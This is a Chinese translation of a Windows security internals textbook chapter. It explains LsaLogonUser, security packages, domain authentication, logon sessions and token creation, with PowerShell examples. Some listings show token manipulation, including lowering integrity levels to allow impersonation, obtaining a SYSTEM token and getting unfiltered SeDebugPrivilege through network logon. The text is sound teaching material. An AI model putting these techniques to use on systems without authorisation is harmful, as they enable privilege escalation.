Windows NT中的一项原始安全功能是安全注意序列（SAS），用户可以通过按CTRL-ALT-DELETE来调用它。这个组合键的处理被内置在操作系统中，因此应用程序无法阻止它。当按下这个组合键时，系统会通知Winlogon，后者会切换桌面以显示身份验证提示或选项菜单。通过使SAS无法被阻止，Windows确保了用户可以在计算机上安全地输入凭据。

最新版本的Windows默认不使用SAS作为LogonUI，尽管它仍然是一个可配置选项。如果你已经通过身份验证并按下CTRL-ALT-DELETE，系统将切换到Winlogon桌面以显示此处所示的菜单。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/pg399.webp)

### LsaLogonUser API

我们已经了解了在Windows上创建桌面的基础知识。现在，让我们深入探讨LsaLogonUser API如何为Winlogon及本地系统上的其他应用程序实现交互式身份验证服务。这个API看似相当复杂，但实际上，它仅需应用程序提供三部分信息即可验证用户身份：

- 请求的登录类型
- 安全包标识符
- 用户的凭据

该API利用*登录类型*来适应不同的身份验证场景。表12-1列出了应用程序最常用的登录类型。

| 登录类型             | 描述                                                         |
| :------------------- | :----------------------------------------------------------- |
| 交互式（Interactive） | 与本地桌面进行交互。                                         |
| 批处理（Batch）       | 作为后台进程运行，即使没有桌面可用。                         |
| 服务（Service）       | 作为系统服务运行。                                           |
| 网络（Network）       | 从网络客户端与系统进行交互。                                 |
| 网络明文（NetworkCleartext） | 执行网络身份验证，但存储用户凭据以供后续使用。               |
| 新凭据（NewCredentials） | 克隆调用者的令牌并更改网络用户凭据。                         |
| 远程交互（RemoteInteractive） | 通过远程桌面协议与桌面进行交互。                             |
| 解锁（Unlock）        | 验证用户凭据以解锁桌面。                                     |

解锁是一种特殊类型，Winlogon使用它来验证锁定屏幕上的用户凭据，应用程序通常不会直接使用。我们将在本章后面讨论其他一些登录类型。

Windows将身份验证的细节抽象为*安全包*，它为身份验证协议提供了标准化接口。身份验证协议是一个正式过程，它接收一组凭据并验证其有效性。它还提供了一种机制，用于返回已验证用户的信息，例如其组成员身份。我们有时也将安全包称为*安全支持提供程序（SSP）*。

我们可以使用Get-LsaPackage PowerShell命令枚举可用的安全包，如代码清单 12-1所示。




```
PS> Get-LsaPackage | Select-Object Name, Comment
Name                                         Comment
----                                         -------
Negotiate                                    Microsoft Package Negotiator ❶
NegoExtender                                 NegoExtender Security Package
Kerberos                                     Microsoft Kerberos V1.0
NTLM                                         NTLM Security Package ❷
TSSSP                                        TS Service Security Package
pku2u                                        PKU2U Security Package
CloudAP                                      Cloud AP Security Package
WDigest                                      Digest Authentication for Windows
Schannel                                     Schannel Security Package
Microsoft Unified Security Protocol Provider Schannel Security Package
Default TLS SSP                              Schannel Security Package
CREDSSP                                      Microsoft CredSSP Security Provider
```


*代码清单 12-1：枚举受支持的安全包*

应用程序通常通过更通用的API访问安全包，该API与所使用的身份验证协议无关。例如，LsaLogonUser通过接受要使用的包的唯一标识符，可在多个不同的包之间工作。安全包还可以实现网络身份验证协议，我们将在后续章节中更深入地介绍。

本地身份验证中最广泛使用的安全包是*Negotiate* ❶和*NT LAN Manager (NTLM)* ❷。NTLM身份验证协议在Windows NT 3.1中引入，在文档中有时也称为*Microsoft身份验证包V1.0*。Negotiate包可以根据情况自动选择不同的身份验证协议。例如，如果本地向SAM数据库进行身份验证，它可能会选择NTLM；而在向域进行身份验证时，则可能选择Kerberos。

支持的凭据类型取决于用于身份验证的安全包。例如，NTLM仅支持用户名和密码凭据，而Kerberos除了用户名和密码外，还支持X.509证书和智能卡身份验证。

#### 本地身份验证

让我们更详细地探讨LsaLogonUser API如何验证用户身份。图12-2概述了针对本地SAM数据库中用户的此过程。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure12-2.webp)

图12-2：使用LsaLogonUser的本地身份验证过程

由于LsaLogonUser API的复杂性，应用程序更常使用系统提供的更简单的API。例如，LogonUser API接受用户名、域名、密码和登录类型，并为底层安全包适当地格式化参数。

然后，它将包括用户凭据在内的这些参数转发给LSA进程中的LsaLogonUser API ❶。该API随后将身份验证请求转发给所选的安全包，在本例中，该安全包是*MSV1_0.DLL*库中实现的NTLM包。

安全包会检查用户是否存在于本地SAM数据库中。如果存在，用户的密码会被转换为NT哈希（详见第10章），然后与数据库中存储的值进行比较❷。如果哈希匹配且用户账户已启用，则认证继续进行，用户的详细信息（如组成员身份）会从SAM数据库中读取，供认证过程使用。

现在，安全包已知晓用户的组成员身份和账户详细信息，它可以检查本地安全策略是否允许该用户进行认证❸。主要策略检查所请求的登录类型是否获得了相应的账户权限。表12-2列出了登录类型以及用户必须获得的账户权限才能进行认证。请注意，NewCredentials 登录类型不需要特定的账户权限；我们将在稍后的“网络凭据”旁注框中解释原因。

| 登录类型           | 允许的账户权限                          | 拒绝的账户权限                           |
| :----------------- | :-------------------------------------- | :--------------------------------------- |
| Interactive        | SeInteractiveLogonRight                 | SeDenyInteractiveLogonRight              |
| Batch              | SeBatchLogonRight                       | SeDenyBatchLogonRight                    |
| Service            | SeServiceLogonRight                     | SeDenyServiceLogonRight                  |
| Network            | SeNetworkLogonRight                     | SeDenyNetworkLogonRight                  |
| NetworkCleartext   | SeNetworkLogonRight                     | SeDenyNetworkLogonRight                  |
| NewCredentials     | 不适用                                  | 不适用                                   |
| RemoteInteractive  | SeRemoteInteractiveLogonRight           | SeDenyRemoteInteractiveLogonRight        |
| Unlock             | 与Interactive或RemoteInteractive相同    | 与Interactive或RemoteInteractive相同     |

如果用户未获得必要的账户权限或被明确拒绝该权限，认证将失败。认证还可能受到其他限制；例如，您可以配置用户仅允许在特定时间段内认证，甚至仅允许在一周中的特定日期认证。如果用户不满足任一策略要求，安全包将拒绝认证。

如果用户的凭据有效且策略允许其认证，LSA可以使用NtCreateToken系统调用，基于从SAM和LSA策略数据库中提取的用户信息及其特权来创建令牌❹。应用程序会收到一个令牌句柄，用户随后可以在分配的限制范围内使用该句柄进行模拟或创建新进程，如第4章所述。

#### 域认证

向域控制器认证用户与本地认证没有显著区别，但仍值得强调一些细微差异。图12-3展示了域认证过程。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure12-3.webp)

图12-3：使用LsaLogonUser的域认证过程

域认证过程以与本地认证相同的方式开始。应用程序将凭据和其他参数提供给LSA进程中运行的LsaLogonUser API❶。此时，该API很可能使用Negotiate安全包来选择最合适的认证安全包。

在此示例中，它再次使用NTLM安全包，这易于理解。然而，在现代Windows网络中，您更可能看到使用Kerberos。使用Kerberos进行交互式认证要复杂得多，因此我将等到第14章再提供详细信息。

Windows 还支持在线身份验证协议，例如用于 Microsoft 和 Azure Active Directory 账户的协议。这些账户的身份验证使用 *CloudAP* 安全包，如果它是最佳的安全包，Negotiate 会自动选择它。此选择过程的详细信息超出了本书的范围，尽管我们将在第15章中介绍 Negotiate 的某些方面。

NTLM 安全包再次生成 NT 哈希，但不再查询本地 SAM 数据库，而是确定用户所在域的域控制器。然后，它使用 *Netlogon* 网络协议，将包含用户名和 NT 哈希的身份验证请求转发到域控制器的 NetrLogonSamLogon API。

虽然 Windows 已弃用 Netlogon 协议用于主域身份验证，但在最新版本中并未移除该协议。随着技术过时和安全期望的变化，不移除遗留功能可能导致严重的安全问题。例如，CVE-2020-1472（被称为 *Zerologon*）是 Netlogon 协议中的一个严重漏洞，由于该协议使用的弱加密存在缺陷，允许未经身份验证的用户破坏整个域网络。

域控制器在域的用户数据库中验证用户的凭据 ❷。对于现代版本的 Windows，这是 Active Directory，而不是 SAM 数据库。用户还必须已启用，身份验证才能成功。如果哈希匹配，则从 Active Directory 中提取用户信息，并返回给客户端系统。

一旦用户的凭据得到验证，客户端系统可以检查其本地策略 ❸，以确定是否允许用户基于登录类型和其他限制（如时间限制）进行身份验证。如果所有检查都成功，LSA 将生成令牌并将其返回给应用程序 ❹。

缓存域凭据

当连接到域的 Windows 系统与企业网络断开或不可用时，会发生什么？如果身份验证依赖于通过网络联系域控制器，那么您如何对系统进行身份验证以更改网络配置？您可以确保每个用户都有单独的本地用户账户来解决此问题，但这并不是一个非常令人满意的选项。

为了解决此问题，LSA 会存储最近使用的域凭据的缓存。每次成功进行域身份验证时，LSA 都会缓存这些凭据。下次用户对系统进行身份验证时，如果由于域控制器不再可访问而导致域身份验证失败，LSA 可以检查所使用的凭据是否与缓存中存储的任何值匹配。如果找到匹配项，它将授予对系统的访问权限。但是，LSA 还会继续尝试联系域控制器以验证用户的凭据。这对于 Kerberos 尤其重要，因为如果没有与域控制器的联系，用户将无法访问任何网络资源。

我在上一章中提到，这些缓存的凭据存储在 SECURITY 注册表配置单元中。我们不会深入探讨此存储的细节，因为它可能在不同版本的 Windows 之间轻易更改。

#### 登录和控制台会话

一旦 LsaLogonUser API 验证了用户的凭据，它就可以为用户创建初始令牌。然而，在调用 NtCreateToken 之前，LSA 必须设置关联的登录会话。我们在第4章中，在令牌的身份验证 ID 的上下文中讨论了登录会话，但值得更深入地探讨其内容。

让我们首先使用 Get-NtLogonSession PowerShell 命令查询 LSA 的所有当前登录会话，如代码清单 12-2所示。您应该以管理员身份运行此命令，以显示系统上的所有登录会话。




```
PS> Get-NtLogonSession | Sort-Object LogonId
LogonId           UserName                     LogonType          SessionId
-------           --------                     ---------          ---------
❶ 00000000-000003E4 NT AUTHORITY\NETWORK SERVICE Service            0
00000000-000003E5 NT AUTHORITY\LOCAL SERVICE   Service            0
❷ 00000000-000003E7 NT AUTHORITY\SYSTEM          UndefinedLogonType 0
❸ 00000000-00006A39 Font Driver Host\UMFD-0      Interactive        0
00000000-00006A96 Font Driver Host\UMFD-1      Interactive        1
00000000-0000C5E9 Window Manager\DWM-1         Interactive        1
❹ 00000000-00042A51 GRAPHITE\user                Interactive        1
00000000-00042AB7 GRAPHITE\user                Interactive        1
00000000-000E7A72 Font Driver Host\UMFD-3      Interactive        2
00000000-000E7CF2 Window Manager\DWM-3         Interactive        2
```


*代码清单 12-2：显示所有当前登录会话*

我们可以看到，前两个会话是服务账户 ❶，如 LogonType 值所示。奇怪的是，第三个会话也是服务账户，用于 *SYSTEM* 用户，但请注意 LogonType 是未定义的 ❷。这是因为内核在 LSA 进程启动之前创建了 *SYSTEM* 登录会话，这意味着没有进行任何身份验证。

其余登录会话对应交互式账户，如“交互式”登录类型所示❸。其中仅有一个用户通过了身份验证❹；其他账户属于系统进程，例如用户模式字体驱动程序（UMFD）和桌面窗口管理器（DWM）。我们不会深入讨论这些系统进程。请注意，当前用户有两个登录会话，这是因为UAC（在第4章中介绍）所致；我们将在稍后的“令牌创建”一节中回头解释 UAC 为何会生成两个会话。

另请注意，每个登录会话除了显示标识账户的身份验证标识符（LogonId）外，还显示了一个SessionId。这是控制台会话ID。务必不要混淆登录会话和控制台会话类型。如该输出所示，单个控制台会话可以承载多个独立的登录会话，而单个登录会话也可以跨多个控制台会话使用。

LSA存储了登录会话创建时最初关联的控制台会话ID。在代码清单 12-3中，我们通过`Get-NtConsoleSession`查询LSA以获取所有当前控制台会话。此行为允许多个用户共享同一控制台和桌面。

```
PS> Get-NtConsoleSession
SessionId UserName      SessionName            State
--------- --------      -----------            -----
0                       Services               Disconnected
1         GRAPHITE\user 31C5CE94259D4006A9E4#0 Active
2                       Console                Connected
```

*代码清单 12-3：显示所有当前控制台会话*

`SessionName`列指示控制台会话连接的位置。会话0是服务控制台，意味着它仅用于系统服务。`State`列指示UI的状态。对于会话0，该状态设置为“已断开”，因为没有显示UI。

会话1是在用户成功完成交互式身份验证过程时按需创建的。`UserName`列标识已通过身份验证的用户。会话状态设置为“活动”，因为这是我运行PowerShell命令的控制台会话。会话名称是一个唯一值，表明这是一个远程桌面连接。

最后，会话2位于物理控制台上。它显示状态为“已连接”，因为当前它承载着一个LogonUI，以防用户尝试物理登录到机器。然而，此时会话2中没有已通过身份验证的用户，如清单中缺少`UserName`所示。

图12-4总结了此示例中登录会话和控制台会话之间的关系。控制台会话是背景中的灰色框，登录会话是前景中的白色框。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure12-4.webp)

图12-4：控制台和登录会话

请注意，控制台会话0包含服务登录会话，例如本地系统、网络服务和本地服务的会话。本地系统登录会话也用于在控制台会话2中运行的LogonUI进程。右下角是控制台会话1，其中包含两个用户登录会话：一个用于UAC管理员，另一个用于经过筛选的非管理员。

**网络凭据**

登录会话中存储的另一个重要值是用户的网络身份验证凭据。存储这些凭据可以避免用户为每个网络服务重新输入凭据。然而，并非所有类型的登录会话都存储网络凭据；例如，“交互式”和“批处理”登录类型会存储凭据，但“网络”登录类型不会。如果您希望网络登录会话存储网络凭据，可以使用“网络明文”登录类型。

“新凭据”登录类型不会对新的用户进行身份验证。相反，LSA会复制调用者的令牌，创建一个新的登录会话，并仅将提供的凭据用于网络身份验证。这允许用户以不同用户的身份在本地和远程进行身份验证。请注意，此登录类型在调用`LsaLogonUser`时不会验证凭据；它仅在凭据被使用时才进行验证。这意味着，如果您指定了错误的凭据，`LsaLogonUser`将返回成功，但稍后在需要凭据时会失败。

我们将在后续章节中更详细地介绍网络身份验证及其与用户网络身份验证凭据的交互方式。

#### 令牌创建

有了新的登录会话，LSA可以为用户创建最终的令牌对象。为此，它必须收集有关令牌各种安全属性的信息，包括用户的组、特权和登录会话ID，然后将这些信息传递给`NtCreateToken`。

你可能想知道用户的组来自哪里。由于域身份验证是最复杂的情况，让我们考虑当Winlogon对用户进行身份验证时，分配给域用户令牌的组。（在本地身份验证过程中，组分配将类似，只是LSA仅考虑本地组。）表12-3显示了*alice*用户的组分配情况。

| 组名                                       | 组来源                               |
| :----------------------------------------- | :----------------------------------- |
| MINERAL\alice                              | 域用户账户                           |
| MINERAL\Domain Users                       | 域组成员资格                         |
| Authentication authority asserted identity |                                      |
| NT AUTHORITY\Claims Valid                  |                                      |
| MINERAL\Local Resource                     | 域本地资源组成员资格                 |
| BUILTIN\Administrators                     | 本地组成员资格                       |
| BUILTIN\Users                              |                                      |
| NT AUTHORITY\INTERACTIVE                   | 自动LSA组                            |
| NT AUTHORITY\Authenticated Users           |                                      |
| Everyone                                   |                                      |
| Mandatory Label\High Mandatory Level       |                                      |
| NT AUTHORITY\LogonSessionId_0_6077548      | Winlogon组                           |
| LOCAL                                      |                                      |

如您所见，添加到令牌中的组来自六个来源。第一个条目来自域用户账户。（在本地身份验证场景中，该组将来自本地用户账户。）

接下来是域组成员资格。这些来自上一章讨论的通用组和全局组范围。*alice*用户是第一个组*Domain Users*的成员。另外两个组在用户身份验证时自动生成。*Authentication authority asserted identity*组与一项名为*Service for User (S4U)*的功能相关，我们将在第14章讨论Kerberos身份验证时探讨该功能。

以下来源包括具有域本地范围的组。这些域本地组在令牌中标记为资源组属性，尽管该属性不影响它们在访问检查中的使用。用户所属的域本地资源组列表在NetrLogonSamLogon API的响应中返回，称为*特权属性证书(Privilege Attribute Certificate, PAC)*。我们将在第14章中再次讨论PAC。

接下来，用户所属的任何本地组都会被添加到令牌中。这些本地组可以根据身份验证过程中提供的域SID进行选择。

随后是自动LSA组。*Everyone*和*Authenticated Users*组的成员资格会自动授予所有经过身份验证的令牌。*INTERACTIVE*组成员资格在用户使用交互式登录类型进行身份验证时授予。表12-4提供了不同登录类型添加的SID列表。如果用户被视为管理员（例如，他们属于*Administrators*组或具有某些高级特权），LSA会自动添加*Mandatory Label\High Mandatory Level* SID。这将令牌的完整性级别设置为高。普通用户获得*Medium Mandatory Level* SID，而系统服务用户（如*SYSTEM*）获得*System Mandatory Level* SID。

| 登录类型            | 名称                                                         | SID             |
| :---------------- | :----------------------------------------------------------- | :-------------- |
| 交互式             | NT AUTHORITY\INTERACTIVE                                     | S-1-5-4         |
| 批处理             | NT AUTHORITY\BATCH                                           | S-1-5-3         |
| 服务               | NT AUTHORITY\SERVICE                                         | S-1-5-6         |
| 网络               | NT AUTHORITY\NETWORK                                         | S-1-5-2         |
| 网络明文           | NT AUTHORITY\NETWORK                                         | S-1-5-2         |
| 新凭据             | 与原始令牌相同                                               | 不适用           |
| 远程交互式         | NT AUTHORITY\INTERACTIVENT AUTHORITY\REMOTE INTERACTIVE LOGON | S-1-5-4S-1-5-14 |
| 解锁               | 与被解锁的登录会话相同                                       | 不适用           |

为每种登录类型提供唯一的SID，使得安全描述符能够根据登录类型来保护资源。例如，安全描述符可以显式拒绝*NT AUTHORITY\NETWORK* SID的访问，这意味着通过网络认证的系统将拒绝用户访问该资源，而其他已认证用户则获得访问权限。

添加到令牌中的第六组SID是Winlogon在调用LsaLogonUser API时添加的组。该API允许启用了SeTcbPrivilege的调用者向创建的令牌中添加任意组SID，因此Winlogon会添加一个登录会话SID和一个*LOCAL* SID。该登录会话SID的两个RID值是从NtAllocateLocallyUniqueId系统调用生成的LUID中提取的两个32位整数。你可能会认为该LUID应与用于登录会话的LUID匹配。然而，由于该SID是在调用LSA创建登录会话之前创建的，因此这不可能实现。此SID用于保护临时资源，例如用户的*BaseNamedObjects*目录。

> 注意
>
> *如果在创建令牌时未指定登录会话SID，LSA将自动为你添加一个。但它会遵循相同的模式，使用与令牌登录会话不同的LUID。*

如第10章所述，令牌的特权基于存储在本地LSA策略数据库中的账户权限。即使在域认证中也是如此；然而，账户权限可以通过部署到域中计算机的域组策略进行修改。

如果用户被视为管理员、UAC已启用，并且用户使用交互式或远程交互式登录类型进行认证，LSA将首先构建完整令牌并创建新的登录会话，然后创建完整令牌的第二个副本，该副本具有新的登录会话，但调用NtFilterToken来移除管理员特权（详见第4章）。随后，LSA会将两个令牌链接在一起，并将过滤后的令牌返回给调用者。这就是我们在代码清单 12-2中观察到同一用户有两个登录会话的原因。

你可以通过调整系统的UAC设置来禁用令牌拆分行为。对于*Administrator*用户，该行为默认也是禁用的，该用户在Windows安装时始终创建，但仅在Windows Server系统上默认启用。LSA会检查用户SID的最后一个RID：如果它是500，与*Administrator*用户匹配，则不会拆分令牌。

### 从PowerShell中使用LsaLogonUser API

既然你已经了解了LsaLogonUser API的工作原理，接下来我们看看如何从NtObjectManager PowerShell模块中访问该API。除非你以SeTcbPrivilege权限运行PowerShell，否则API的某些功能将被阻止，例如向令牌添加新的组SID，但如果你拥有用户的用户名和密码，你仍然可以创建新令牌。

我们通过`Get-NtToken`命令和`Logon`参数来访问该API。代码清单 12-4展示了如何使用`Get-NtToken`来认证新用户。




```
PS> $password = Read-Host -AsSecureString -Prompt "Password"
Password: ********
PS> $token = Get-NtToken -Logon -User user -Domain $env:COMPUTERNAME
-Password $password -LogonType Network
PS> Get-NtLogonSession -Token $token
LogonId           UserName         LogonType SessionId
-------           --------         --------- ---------
00000000-9BBFFF01 GRAPHITE\user    Network   3
```


*代码清单 12-4：认证用户*

最好不要在命令行中直接输入密码。相反，我们使用带有`AsSecureString`属性的`Read-Host`来将密码读取为安全字符串。

然后我们可以调用`Get-NtToken`，指定用户名、域名和密码。（在此示例中，将用户名`user`替换为有效的本地用户。）我们将域设置为本地计算机的名称，表示我们希望使用本地账户进行认证。你可以设置任何登录类型，但在此我们指定`Network`，这对所有用户都有效。LSA是否允许其他登录类型取决于分配的用户权限。

> 注意
>
> *默认情况下，LsaLogonUser API不会在物理控制台之外认证具有空密码的用户。如果你尝试使用具有空密码的用户账户运行该命令，调用将失败。*

登录类型还决定了LsaLogonUser将返回的令牌类型，这基于所创建令牌的预期用途，例如创建新进程或模拟。表12-5显示了登录类型到令牌类型的映射。（我们可以通过复制在主令牌和模拟令牌之间自由转换，因此令牌不必按预期方式使用。）



| 登录类型           | 令牌类型      |
| :----------------- | :------------ |
| Interactive        | 主令牌        |
| Batch              | 主令牌        |
| Service            | 主令牌        |
| Network            | 模拟令牌      |
| NetworkCleartext   | 模拟令牌      |
| NewCredentials     | 主令牌        |
| RemoteInteractive  | 主令牌        |
| Unlock             | 主令牌        |

在代码清单 12-4中，命令返回了一个模拟令牌。你可能会想：在没有启用SeImpersonatePrivilege的情况下，我们是否被允许模拟该令牌，尤其是当令牌属于不同用户时？LSA将新令牌的起源ID设置为调用者的认证ID，因此根据第4章中涵盖的模拟规则，即使令牌属于不同用户，我们也可以模拟。

这并不被视为安全问题，因为如果你知道用户的密码，你已经可以完全以该用户身份进行认证。在代码清单 12-5中，我们使用`Get-NtTokenId`命令检查起源ID和认证ID是否匹配。




```
PS> Get-NtTokenId -Authentication
LUID
----
00000000-000A0908

PS> Get-NtTokenId -Token $token -Origin
LUID
----
00000000-000A0908
```


*代码清单 12-5：比较认证ID和起源ID*

我们查询主令牌的认证ID，然后查询新令牌的起源ID。输出显示这两个ID是相等的。

然而，对模拟该令牌有一个限制。如果被认证的用户是管理员，并且认证过程使用的登录类型不是Interactive，命令将不会返回过滤后的令牌。相反，它将返回一个具有高完整性级别的管理员令牌。这个完整性级别阻止了令牌被中等完整性级别的进程模拟。但由于返回的令牌句柄具有写访问权限，我们可以在模拟之前将完整性级别降低到中等。我们在代码清单 12-6中执行此操作。




```
PS> Get-NtTokenIntegrityLevel -Token $token
High

PS> Test-NtTokenImpersonation $token
False

PS> Set-NtTokenIntegrityLevel -Token $token Medium
PS> Test-NtTokenImpersonation $token
True
```


*代码清单 12-6：测试模拟返回令牌的能力*

在这种情况下，我们认证的令牌是*Administrators*组的成员，因此具有高完整性级别。我们尝试模拟它，如你所见，命令返回False。然后我们将令牌的完整性级别设置为中等，并再次测试模拟。操作现在返回True。

### 使用令牌创建新进程

如果你使用返回主令牌的登录类型，可能会认为该令牌足以让你创建新进程。为了测试这一点，请以非管理员用户身份运行代码清单 12-7，并确保将用户名更改为有效账户。




```
PS> $token = Get-NtToken -Logon -User user -Domain $env:COMPUTERNAME
-Password $password -LogonType Interactive
PS> New-Win32Process cmd.exe -Token $token
Exception calling "CreateProcess": "A required privilege is not held
by the client"
```


*代码清单 12-7：使用已认证令牌创建新进程*

你会发现创建新进程会失败。这是因为新令牌不符合第4章中描述的主令牌分配要求。如果调用进程拥有`SeAssignPrimaryTokenPrivilege`特权（Winlogon通常具备），进程创建就能成功；然而，普通用户进程并不拥有此特权。

不过，如果你以管理员身份重新运行该命令，它应该会成功，即使管理员默认并未获得该特权。让我们探讨一下原因。`New-Win32Process`命令首先尝试使用`CreateProcessAsUser` API在进程内创建进程。由于调用进程没有`SeAssignPrimaryTokenPrivilege`，此操作会失败。

失败后，`New-Win32Process` API会回退调用另一个API——`CreateProcessWithToken`。该API并非在进程内实现，而是在系统服务（即辅助登录服务）中实现，该服务拥有`SeAssignPrimaryTokenPrivilege`。在这种情况下，服务会在创建新进程前检查调用者是否拥有`SeImpersonatePrivilege`。

因此，该命令对于获得`SeImpersonatePrivilege`的管理员有效。即便如此，管理员也不应仅依赖`CreateProcessWithToken`，因为该API不支持`CreateProcessAsUser`的许多功能，例如向新进程继承任意句柄。

此外，非管理员用户也有办法以其他用户身份创建进程。辅助登录服务还提供了另一个API——`CreateProcessWithLogon`，它接受用户名、域名和密码来创建用户，而不是令牌句柄。该服务使用`LsaLogonUser`对用户进行身份验证，然后使用认证后的令牌调用`CreateProcessAsUser`。由于服务拥有`SeAssignPrimaryTokenPrivilege`，进程创建将成功。

你可以在调用`New-Win32Process`命令时指定`Credential`参数来使用`CreateProcessWithLogon`，如代码清单 12-8所示。




```
PS> $creds = Read-LsaCredential
UserName: alice
Domain: MINERAL
Password: ********

PS> $proc = New-Win32Process -CommandLine cmd.exe -Credential $creds
PS> $proc.Process.User
Name          Sid
----          ---
MINERAL\alice S-1-5-21-1195776225-522706947-2538775957-1110
```


*代码清单 12-8：使用New-Win32Process调用CreateProcessWithLogon*

这里我们读取*alice*用户的凭据，并使用`New-Win32Process`创建新进程，通过`Credential`参数指定凭据。这将调用`CreateProcessWithLogon` API。

该API会返回进程和线程句柄以供使用。例如，我们可以查询进程用户，结果显示它是使用*alice*用户的认证令牌创建的。

该API不允许你指定用户的登录类型（默认使用交互式登录），但你可以在`LogonFlags`参数中指定`NetCredentialsOnly`标志，以改用`NewCredentials`登录类型。

### 服务登录类型

在本章结束前，我们再详细讨论一下服务登录类型。服务控制管理器使用此登录类型为系统服务进程创建令牌。它允许任何已获得 `SeServiceLogonRight` 账户权限的用户账户进行身份验证。

然而，LSA还支持四个众所周知的本地服务账户，这些账户不存储在 SAM 数据库中。我们可以通过指定域名为 `NT AUTHORITY`，使用服务登录类型以及 表 12-6 中列出的用户名之一，调用 `LsaLogonUser` 来创建它们，该表还显示了用户 SID。

| 用户名                           | 用户 SID |
| :------------------------------- | :------- |
| IUSR                             | S-1-5-17 |
| SYSTEM                           | S-1-5-18 |
| LOCAL SERVICE 或 LocalService    | S-1-5-19 |
| NETWORK SERVICE 或 NetworkService | S-1-5-20 |

*SYSTEM* 用户是这四个用户中唯一的 administrator；其他三个用户不是 *Administrators* 组的成员，但它们拥有高级特权，如 `SeImpersonatePrivilege`，这使它们实际上等同于管理员。

*IUSR* 账户代表匿名互联网用户。它用于在 Internet Information Services (IIS) Web 服务器配置为匿名身份验证时降低其权限。当请求到达 IIS Web 服务器且未携带用户凭据时，服务器会在打开任何资源（如文件）之前模拟 *IUSR* 账户令牌。这可以防止以特权用户身份意外地远程暴露资源。

对于这些内置服务账户，您无需指定密码，但需要以启用了 `SeTcbPrivilege` 的方式调用 `LsaLogonUser`，这可以防止其在系统服务之外被使用。代码清单 12-9 展示了如何使用 `Get-NtToken` 创建 *SYSTEM* 用户令牌。请以管理员身份运行这些命令。

```
PS> Get-NtToken -Logon -LogonType Service -Domain 'NT AUTHORITY' -User SYSTEM 
-WithTcb
User                GroupCount PrivilegeCount AppContainer Restricted
----                ---------- -------------- ------------ ----------
NT AUTHORITY\SYSTEM 11         31             False        False

PS> Get-NtToken -Service System -WithTcb
User                GroupCount PrivilegeCount AppContainer Restricted
----                ---------- -------------- ------------ ----------
NT AUTHORITY\SYSTEM 11         31             False        False
```

*代码清单 12-9：获取* SYSTEM *用户令牌*

即使以管理员身份运行，您默认也不会获得 `SeTcbPrivilege`，因此该命令支持 `WithTcb` 参数，它会自动模拟一个启用了该特权的令牌。您还可以通过使用 `Service` 参数并指定要创建的服务用户名称来简化服务账户的创建。

### 工作示例

让我们通过一些示例来演示如何在本章介绍的各种命令在安全研究或系统分析中的应用。

#### 测试特权与登录账户权限

我在第10章中提到，可以使用`Add-NtAccountRight`命令将SID添加到账户权限列表中。现在我们已经知道如何对用户进行身份验证，接下来使用此命令来探索这些账户权限。在代码清单 12-10中，我们为新用户分配特权和登录账户权限。请以管理员身份运行这些命令。

```
PS> $password = Read-Host -AsSecureString -Prompt "Password"
Password: ********
❶ PS> $user = New-LocalUser -Name "Test" -Password $password
PS> $sid = $user.Sid.Value
❷ PS> $token = Get-NtToken -Logon -User $user.Name -SecurePassword $password
-LogonType Interactive
PS> $token.ElevationType
Default

PS> $token.Close()
❸ PS> Add-NtAccountRight -Privilege SeDebugPrivilege -Sid $sid
PS> $token = Get-NtToken -Logon -User $user.Name -SecurePassword $password
-LogonType Interactive
PS> Enable-NtTokenPrivilege -Token $token SeDebugPrivilege -PassThru
❹ WARNING: Couldn't set privilege SeDebugPrivilege

PS> $token.ElevationType
Limited

PS> $token.Close()
❺ PS> $token = Get-NtToken -Logon -User $user.Name -SecurePassword $password
-LogonType Network
PS> Enable-NtTokenPrivilege -Token $token SeDebugPrivilege -PassThru
Name             Luid              Enabled
----             ----              -------
❻ SeDebugPrivilege 00000000-00000014 True

PS> $token.ElevationType
Default

PS> $token.Close()
❼ PS> Add-NtAccountRight -LogonType SeDenyInteractiveLogonRight -Sid $sid
PS> Add-NtAccountRight -LogonType SeBatchLogonRight -Sid $sid
❽ PS> Get-NtToken -Logon -User $user.Name -SecurePassword $password
-LogonType Interactive
Get-NtToken : (0x80070569) - Logon failure: the user has not been granted
the requested logon type at this computer.

PS> $token = Get-NtToken -Logon -User $user.Name -SecurePassword $password
-LogonType Batch
PS> Get-NtTokenGroup $token | Where-Object {$_.Sid.Name -eq 
"NT AUTHORITY\BATCH"}
Sid        : S-1-5-3
Attributes : Mandatory, EnabledByDefault, Enabled
Enabled    : True
Mandatory  : True
DenyOnly   : False
❾ Name       : NT AUTHORITY\BATCH

PS> $token.Close()
❿ PS> Remove-NtAccountRight -Privilege SeDebugPrivilege -Sid $sid
PS> Remove-NtAccountRight -LogonType SeDenyInteractiveLogonRight -Sid $sid
PS> Remove-NtAccountRight -LogonType SeBatchLogonRight -Sid $sid
PS> Remove-LocalUser $user
```

*代码清单 12-10：为新用户分配账户权限*

我们首先创建一个新用户❶，并测试我们能否进行交互式身份验证❷。之所以能够这样做，是因为该用户自动成为*BUILTIN\Users*组的成员，该组默认拥有`SeInteractiveLogonRight`权限。我们还通过查看`ElevationType`参数来检查令牌是否因用户账户控制（UAC）而被过滤，该参数显示为`Default`，表明未发生过滤。

接下来，我们为用户分配`SeDebugPrivilege`特权❸。这是一个高级特权，因此我们应预期LSA会执行UAC过滤。当我们对该用户进行身份验证时，发现情况确实如此：我们无法启用`SeDebugPrivilege`，因为它已被过滤❹，且`ElevationType`现在设置为`Limited`。

然而，我们可以改用网络身份验证❺，这种方式不受默认UAC过滤规则的影响。现在我们可以启用`SeDebugPrivilege`❻，`ElevationType`再次变为`Default`，表明未发生过滤。

然后，我们测试登录账户权限。请记住，用户因是*BUILTIN\Users*组的成员而获得`SeInteractiveLogonRight`权限。我们不能在不将其从该组移除的情况下删除该登录权限，因此我们改为通过将其SID添加到`SeDenyInteractiveLogonRight`来明确拒绝该特定用户的此权限❼。然后，我们通过尝试交互式登录❽来验证预期行为，此时会返回错误。

